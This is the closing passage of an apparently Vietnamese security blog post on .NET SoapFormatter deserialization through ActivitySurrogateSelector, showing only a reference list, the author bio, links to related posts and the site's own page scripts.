<p>Dùng <code>System.Windows.Forms.AxHost.State</code> wrap để handle exception.</p>
</li>
</ol>
</li>
</ul>
<h2 id="vii-nguồn-tham-khảo">VII Nguồn tham khảo</h2>
<p><a href="https://xz.aliyun.com/t/9595">.net反序列化之SoapFormatter - 先知社区 (aliyun.com)</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/17184631.html">SoapFormatter反序列化链ActivitySurrogateSelector - zpchcbd - 博客园 (cnblogs.com)</a></p>
<p><a href="https://medium0.com/tradahacking/net-deserialization-101-b39b1f33f7c9?source=user_profile---------1----------------------------">.NET Deserialization 101. Như các bạn đã biết, các ngôn ngữ điều… | by hkln1 | tradahacking (medium0.com)</a></p>

    </article>
    
    
<script defer src="/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>
<script>
  'use strict';
  document.addEventListener('DOMContentLoaded', function () {
    
    var clipInit = false;
    var preChromaElem = document.querySelectorAll('pre.chroma');
    var langCodeElem = document.querySelectorAll('.language-code');
    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
    var gtCodeElem = document.querySelectorAll('div.language-\\>');

    var makeClipboard = function(elem) {
      var code = elem,
          text = elem.textContent;
        
      if (text.length > 15) {
        if (!clipInit) {
          var text, clip = new ClipboardJS('.copy-to-clipboard', {
            text: function (trigger) {
              var codeElem = prev(trigger).querySelectorAll('code');
              if (codeElem.length > 1) {
                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
              } else {
                text = prev(trigger).querySelector('code').textContent;
              }

              return text.replace(/^\$\s/gm, '');
            }
          });

          var inPre;
          clip.on('success', function (e) {
            e.clearSelection();
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clip.on('error', function (e) {
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', e.action.toString());
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clipInit = true;
        }

        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
        var isNotAllowedIncluded = false;
        var curClassName = code.getAttribute('class');

        for (var i = 0; i < notAllowedClass.length; i++) {
          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
            isNotAllowedIncluded = true;
            break;
          }
        }

        if (!isNotAllowedIncluded) {
          if (curClassName) {
            var newClipboardElem = document.createElement('span');
            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
            newClipboardElem.setAttribute('title', 'Copy to clipboard');
            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
          }
        }
      }
    }

    var makeSymbolClipboard = function(elem) {
      var clipboardSpan = document.createElement('span');
      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
      clipboardSpan.setAttribute('title', 'Copy to clipboard');
      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
    }

    preChromaElem ? 
    preChromaElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function(codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;
    
    langCodeElem ? 
    langCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;

    dollarCodeElem ? 
    dollarCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;
    
  });
</script>
    <script>
  'use strict';
  
  function wrap(el, wrapper) {
    el.parentNode.insertBefore(wrapper, el);
    wrapper.appendChild(el);
  }

  (function () {
    var singleContentsElem = document.querySelector('.single__contents');
    singleContentsElem ? 
    singleContentsElem.querySelectorAll('pre > code').forEach(function(elem) {
      var dataLang = elem.getAttribute('data-lang');
      var dataLangWrapper = document.createElement('div');
      var code = null;
      var codeTitle = null;

      if (dataLang && dataLang.includes(':')) {
        code = dataLang.split(':')[0];
        codeTitle = dataLang.split(':')[1];

        dataLangWrapper.className = 'language-' + code;
        dataLangWrapper.setAttribute('data-lang', codeTitle);

        elem.className = 'language-' + code;
        elem.setAttribute('data-lang', codeTitle);
        elem.setAttribute('id', codeTitle);
      } else if (!dataLang) {
        dataLangWrapper.setAttribute('data-lang', 'Code');
        dataLangWrapper.className = 'language-code';
      }

      if (!dataLang || codeTitle) {
        wrap(elem.parentNode, dataLangWrapper);
      }

    }) : null;
  })();

  var langCodeElem = document.querySelectorAll('.language-code');
  langCodeElem ? langCodeElem.forEach(function (elem) {
    var newElem = document.createElement('span');
    newElem.className = 'copy-to-clipboard';
    newElem.setAttribute('title', 'Copy to clipboard');
    elem.append(newElem);
  }) : null;
  

  

  
  var dollarCodeElem = document.querySelectorAll('div.language-\\$');
  var gtCodeElem = document.querySelectorAll('div.language-\\>');

  dollarCodeElem ?
  dollarCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '$<br/>';
    }) : null;
  }) : null;

  gtCodeElem ?
  gtCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '><br/>';
    }) : null;
  }) : null;
  
</script>
    
<div class="donation">
  <div class="donation__message">
    Share on
  </div>
  <div class="donation__icons">
    
    
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhlongmt183.github.io%2fposts%2fdot_net_101_soapformatter_activitysurrogateselector%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
        </a>
      
    
      
        <a href="https://twitter.com/intent/tweet?text=%5b.NET%20deserialize%5d%20SoapFormatter%3aActivitySurrogateSelector&url=https%3a%2f%2fminhlongmt183.github.io%2fposts%2fdot_net_101_soapformatter_activitysurrogateselector%2f&hashtags=C%23&via=Edisc" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
        </a>
      
    
  </div>
</div>


    
    
<div class="whoami__gutter"></div>
<hr class="hr-slash whoami-hr"/>
<section class="whoami">
  <div class="whoami__image-wrapper">
    
    
      
        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="Edisc" class="lazyload whoami__image"/>
      
    
  </div>
  <div class="whoami__contents">
    <div class="whoami__written-by">
      WRITTEN BY
    </div>
    <div class="whoami__title">
      
        Edisc
      
    </div>
    <div class="whoami__desc">
      
        Cyber Security Engineer
      
    </div>
    <div class="whoami__social">
      
      
      
      
      
      
      
      
      <a href="mailto:edisc.ctf@gmail.com" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
      
      
      
      <a href="https://www.facebook.com/minhlongv84" title="facebook" aria-label="facebook">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface2747">
<path fill="currentColor" d="M 11.664062 2.003906 C 6.621094 2.171875 2.375 6.25 2.023438 11.289062 C 1.65625 16.617188 5.46875 21.121094 10.507812 21.878906 L 10.507812 14.648438 L 8.890625 14.648438 C 8.164062 14.648438 7.578125 14.0625 7.578125 13.335938 C 7.578125 12.609375 8.164062 12.023438 8.890625 12.023438 L 10.503906 12.023438 L 10.503906 10.273438 C 10.503906 7.378906 11.914062 6.105469 14.324219 6.105469 C 14.679688 6.105469 14.984375 6.113281 15.242188 6.128906 C 15.878906 6.15625 16.371094 6.6875 16.371094 7.324219 C 16.371094 7.988281 15.835938 8.523438 15.171875 8.523438 L 14.730469 8.523438 C 13.710938 8.523438 13.351562 9.492188 13.351562 10.585938 L 13.351562 12.023438 L 15.222656 12.023438 C 15.8125 12.023438 16.265625 12.550781 16.175781 13.132812 L 16.066406 13.835938 C 15.992188 14.304688 15.589844 14.652344 15.113281 14.652344 L 13.351562 14.652344 L 13.351562 21.898438 C 18.234375 21.234375 22 17.0625 22 12 C 22 6.367188 17.339844 1.820312 11.664062 2.003906 Z M 11.664062 2.003906 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      <a href="https://github.com/minhlongmt183/" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://www.linkedin.com/in/long-v%C3%B5-minh-58374318b/" title="linkedin" aria-label="linkedin">
        <svg xmlns="http://www.w3.org/2000/svg" fill="#000000" viewBox="0 0 30 30" width="25" height="25"><path fill="currentColor" d="M24,4H6C4.895,4,4,4.895,4,6v18c0,1.105,0.895,2,2,2h18c1.105,0,2-0.895,2-2V6C26,4.895,25.105,4,24,4z M10.954,22h-2.95 v-9.492h2.95V22z M9.449,11.151c-0.951,0-1.72-0.771-1.72-1.72c0-0.949,0.77-1.719,1.72-1.719c0.948,0,1.719,0.771,1.719,1.719 C11.168,10.38,10.397,11.151,9.449,11.151z M22.004,22h-2.948v-4.616c0-1.101-0.02-2.517-1.533-2.517 c-1.535,0-1.771,1.199-1.771,2.437V22h-2.948v-9.492h2.83v1.297h0.04c0.394-0.746,1.356-1.533,2.791-1.533 c2.987,0,3.539,1.966,3.539,4.522V22z"/></svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://twitter.com/edisc_1" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</section>
<hr class="hr-slash whoami-hr" />


    <section class="related">
    
    
  </section>
    <div class="grow"></div>
<nav class="pagination-single">
  
    
      <a href="https://minhlongmt183.github.io/posts/from_sqli_to_php_deserialize_to_rce_on_pandora_fms/" class="pagination-single__left">
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
        </div>
        <div class="pagination-single__left-title">From SQLi to PHP deserialize to RCE on Pandora FMS 742</div>      
      </a>
    
    <div class="grow"></div>
    
      <a href="https://minhlongmt183.github.io/posts/khi_newbie_hoc_java_deserialization_attack_readobject/" class="pagination-single__right">      
        <div class="pagination-single__right-title">Khi newbie học Java deserialization attack: readObject() native</div>
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
        </div>
      </a>
    
  
</nav>
    
  
    <div id="utterances"></div>
<noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    function checkTheme(local, base) {
      var currentTheme = local || base;

      if (currentTheme === "dark") {
        return "photon-dark";
      } else if (currentTheme === "hacker") {
        return "photon-dark";
      } else if (currentTheme === "kimbie") {
        return "github-dark-orange";
      } else {
        return "github-light";
      }
    }

    try {
      
      var owner = JSON.parse("\"minhlongmt183\"");
      
      var repo = JSON.parse("\"comments\"");
      
      var baseTheme = JSON.parse("\"dark\"");
      var localTheme = localStorage.getItem('theme');
      var utterTheme = checkTheme(localTheme, baseTheme);
      var myScript = document.createElement('script');
      myScript.setAttribute('src', 'https://utteranc.es/client.js');
      myScript.setAttribute('repo', `${owner}/${repo}`);
      myScript.setAttribute('issue-term', 'pathname');
      myScript.setAttribute('theme', utterTheme);
      myScript.setAttribute('crossorigin', 'anonymous');
      myScript.setAttribute('async', '');
      myScript.onload = function() {
      }

      

      document.getElementById('utterances').appendChild(myScript);
    } catch (err) {
      console.log(err);
    }
  });
</script>

<div id="comments-fallback" class="viaemail">
    <div class="utterances__message">
        
        <a href="https://github.com/minhlongmt183/comments/issues/" target="_blank" rel="noreferrer">&nbsp;</a>
    </div>
</div>

  

    <div class="modal micromodal-slide" id="modal" aria-hidden="true">
  <div class="modal__overlay" tabindex="-1" data-micromodal-close>
    <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-title">
      
      <div class="modal__content" id="modal-content">
        <div id="mySwipe" class="swipe">
          <div class="swipe-wrap">
          </div>
        </div>
      </div>

      <span class="modal__items">
        
        <span class="modal__header">
          <div class="modal__paging" title="Page Info" aria-label="Current Page">
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--close" title="Close" aria-label="Close Button" data-micromodal-close>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="25" height="25"><path fill="currentColor" d="M 21.734375 19.640625 L 19.636719 21.734375 C 19.253906 22.121094 18.628906 22.121094 18.242188 21.734375 L 13 16.496094 L 7.761719 21.734375 C 7.375 22.121094 6.746094 22.121094 6.363281 21.734375 L 4.265625 19.640625 C 3.878906 19.253906 3.878906 18.628906 4.265625 18.242188 L 9.503906 13 L 4.265625 7.761719 C 3.882813 7.371094 3.882813 6.742188 4.265625 6.363281 L 6.363281 4.265625 C 6.746094 3.878906 7.375 3.878906 7.761719 4.265625 L 13 9.507813 L 18.242188 4.265625 C 18.628906 3.878906 19.257813 3.878906 19.636719 4.265625 L 21.734375 6.359375 C 22.121094 6.746094 22.121094 7.375 21.738281 7.761719 L 16.496094 13 L 21.734375 18.242188 C 22.121094 18.628906 22.121094 19.253906 21.734375 19.640625 Z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--full" title="Full Screen" aria-label="Full Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="25" height="25"><path fill="currentColor" d="M 5 3 C 3.9069372 3 3 3.9069372 3 5 L 3 8 A 1.0001 1.0001 0 1 0 5 8 L 5 5 L 8 5 A 1.0001 1.0001 0 1 0 8 3 L 5 3 z M 16 3 A 1.0001 1.0001 0 1 0 16 5 L 19 5 L 19 8 A 1.0001 1.0001 0 1 0 21 8 L 21 5 C 21 3.9069372 20.093063 3 19 3 L 16 3 z M 3.984375 14.986328 A 1.0001 1.0001 0 0 0 3 16 L 3 19 C 3 20.093063 3.9069372 21 5 21 L 8 21 A 1.0001 1.0001 0 1 0 8 19 L 5 19 L 5 16 A 1.0001 1.0001 0 0 0 3.984375 14.986328 z M 19.984375 14.986328 A 1.0001 1.0001 0 0 0 19 16 L 19 19 L 16 19 A 1.0001 1.0001 0 1 0 16 21 L 19 21 C 20.093063 21 21 20.093063 21 19 L 21 16 A 1.0001 1.0001 0 0 0 19.984375 14.986328 z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--normal" title="Normal Screen" aria-label="Normal Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25"><path fill="currentColor" d="M 16.96875 4.972656 C 15.867188 4.988281 14.984375 5.894531 15 7 L 15 15 L 7 15 C 6.277344 14.988281 5.609375 15.367188 5.246094 15.992188 C 4.878906 16.613281 4.878906 17.386719 5.246094 18.007813 C 5.609375 18.632813 6.277344 19.011719 7 19 L 19 19 L 19 7 C 19.007813 6.460938 18.796875 5.941406 18.414063 5.558594 C 18.03125 5.175781 17.511719 4.964844 16.96875 4.972656 Z M 32.96875 4.972656 C 31.921875 4.988281 31.0625 5.8125 31.003906 6.859375 C 31 6.90625 31 6.953125 31 7 L 31 19 L 43 19 C 43.066406 19 43.132813 19 43.199219 18.992188 C 44.269531 18.894531 45.070313 17.972656 45.015625 16.902344 C 44.964844 15.828125 44.074219 14.988281 43 15 L 35 15 L 35 7 C 35.007813 6.460938 34.796875 5.941406 34.414063 5.558594 C 34.03125 5.175781 33.511719 4.964844 32.96875 4.972656 Z M 7 31 C 6.277344 30.988281 5.609375 31.367188 5.246094 31.992188 C 4.878906 32.613281 4.878906 33.386719 5.246094 34.007813 C 5.609375 34.632813 6.277344 35.011719 7 35 L 15 35 L 15 43 C 14.988281 43.722656 15.367188 44.390625 15.992188 44.753906 C 16.613281 45.121094 17.386719 45.121094 18.007813 44.753906 C 18.632813 44.390625 19.011719 43.722656 19 43 L 19 31 Z M 31 31 L 31 43 C 30.988281 43.722656 31.367188 44.390625 31.992188 44.753906 C 32.613281 45.121094 33.386719 45.121094 34.007813 44.753906 C 34.632813 44.390625 35.011719 43.722656 35 43 L 35 35 L 43 35 C 43.722656 35.011719 44.390625 34.632813 44.753906 34.007813 C 45.121094 33.386719 45.121094 32.613281 44.753906 31.992188 C 44.390625 31.367188 43.722656 30.988281 43 31 Z"/></svg>
          </div>
        </span>
        
        <div class="modal__icon modal__arrow modal__arrow--left" title="Arrow Left" aria-label="Arrow Left Button">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 23.28125 11 L 10 10 L 10 6.851563 C 10 6.523438 9.839844 6.277344 9.519531 6.03125 C 9.199219 5.949219 8.878906 5.949219 8.640625 6.113281 C 5.359375 8.410156 2.238281 12.257813 2.160156 12.421875 C 2.082031 12.578125 2.007813 12.8125 2.003906 12.976563 C 2.003906 12.980469 2 12.988281 2 12.992188 C 2 13.15625 2.078125 13.402344 2.160156 13.484375 C 2.238281 13.648438 5.28125 17.507813 8.640625 19.804688 C 8.960938 19.96875 9.28125 20.050781 9.519531 19.886719 C 9.839844 19.722656 10 19.476563 10 19.148438 L 10 16 L 23.28125 15 C 23.679688 14.679688 24 13.875 24 12.992188 C 24 12.195313 23.761719 11.320313 23.28125 11 Z"/></svg>
        </div>
        
        <div class="modal__icon modal__arrow modal__arrow--right" title="Arrow Right" aria-label="Arrow Right Button">

          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 2.71875 11.023438 L 16 10.023438 L 16 6.875 C 16 6.546875 16.160156 6.300781 16.480469 6.054688 C 16.800781 5.972656 17.121094 5.972656 17.359375 6.136719 C 20.640625 8.433594 23.761719 12.28125 23.839844 12.445313 C 23.917969 12.601563 23.992188 12.835938 23.996094 13 C 23.996094 13.003906 24 13.011719 24 13.015625 C 24 13.179688 23.921875 13.425781 23.839844 13.507813 C 23.761719 13.671875 20.71875 17.53125 17.359375 19.828125 C 17.039063 19.992188 16.71875 20.074219 16.480469 19.910156 C 16.160156 19.746094 16 19.5 16 19.171875 L 16 16.023438 L 2.71875 15.023438 C 2.320313 14.703125 2 13.898438 2 13.015625 C 2 12.21875 2.238281 11.34375 2.71875 11.023438 Z"/></svg>
        </div>

        <div class="modal__caption">
          <div class="modal__caption--text">
          </div>
        </div>

      </span>
    </div>
  </div>
</div>


<script defer src="/js/swipe.min.feb438efb7ca009ecd7fc2ac3ad2fced4840990b2798d81f87137f2dc6281f05.js"></script>

<script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function () {
  
   
  var docElem = document.documentElement;

   
  function openFullscreen() {
    if (docElem.requestFullscreen) {
      docElem.requestFullscreen();
    } else if (docElem.mozRequestFullScreen) {  
      docElem.mozRequestFullScreen();
    } else if (docElem.webkitRequestFullscreen) {  
      docElem.webkitRequestFullscreen();
    } else if (docElem.msRequestFullscreen) {  
      docElem.msRequestFullscreen();
    }
  }

   
  function closeFullscreen() {
    if (document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement) {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.mozCancelFullScreen) {  
        document.mozCancelFullScreen();
      } else if (document.webkitExitFullscreen) {  
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) {  
        document.msExitFullscreen();
      }
    }
  }

  var modal = document.getElementById('modal');
  var galleryContainerElem = document.querySelector('.gallery__container');
  var swipeWrapElem = document.querySelector('.swipe-wrap');
  var mySwipeElem = document.getElementById('mySwipe');
  var arrowLeftElem = document.querySelector('.modal__arrow--left');
  var arrowRightElem = document.querySelector('.modal__arrow--right');
  var closeElem = document.querySelector('.modal__toolbar--close');
  var fullElem = document.querySelector('.modal__toolbar--full');
  var normalElem = document.querySelector('.modal__toolbar--normal');
  var captionElem = document.querySelector('.modal__caption');
  var pagingElem = document.querySelector('.modal__paging');
  var itemsElem = document.querySelector('.modal__items');
  var imgTotalNum = null;
  var myFadeTimeout = null;
  var mySwipe = null;
  var keydownFunction = function (e) {
    if (e.key === 'ArrowRight') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.next();
      }
    } else if (e.key === 'ArrowLeft') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.prev();
      }
    }
  }

  if (galleryContainerElem) {
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  } else {
    galleryContainerElem = document.querySelector('.single__contents');
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  }

  MicroModal.init({
    onClose: function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
        closeFullscreen();
      }
      window.removeEventListener('keydown', keydownFunction);
    },
    disableScroll: true,
    disableFocus: true,
    awaitOpenAnimation: false,
    awaitCloseAnimation: false,
    debugMode: false,
  });

  var imageLoad = function(src) {
    return new Promise(function(resolve, reject) {
      var newImg = new Image;
      newImg.onload = function() {
        resolve(newImg);
      }
      newImg.onerror = reject;
      newImg.src = src;
    });
  }

  galleryContainerElem.querySelectorAll('img').forEach(function (elem, idx) {
    elem.style.cursor = 'pointer';

    var clonedElem = elem.cloneNode(true);
    clonedElem.style.maxHeight = '100%';
    clonedElem.style.maxWidth = '100%';
    clonedElem.onclick = function (e) {
      e.stopPropagation();
    }

    var wrapper = document.createElement('div');
    wrapper.style.width = '100%';
    wrapper.style.height = '100vh';
    wrapper.setAttribute('data-micromodal-close', '');
    wrapper.onclick = function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
    }
    wrapper.onmouseenter = function () {
      clearTimeout(myFadeTimeout);
      fadeIn(itemsElem, 200);
    };
    wrapper.onmouseleave = function () {
      myFadeTimeout = setTimeout(function () {
        fadeOut(itemsElem, 200);
      }, 2500);
    }
    wrapper.ontouchstart = function() {
      fadeIn(itemsElem, 200);
    }
    wrapper.append(clonedElem);
    swipeWrapElem.append(wrapper);

    elem.addEventListener('click', async function (e) {
      MicroModal.show('modal');
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }

      var imgSrc = e.target.getAttribute('data-src') || e.target.getAttribute('src');
      var img = await imageLoad(imgSrc);
      clonedElem.style.width = img.width + 'px';
      clonedElem.style.height = img.height + 'px';
      
      
      mySwipe = new Swipe(mySwipeElem, {
        startSlide: idx,
        draggable: true,
        autoRestart: false,
        continuous: false,
        disableScroll: true,
        stopPropagation: true,
        callback: async function (index, element) {
          
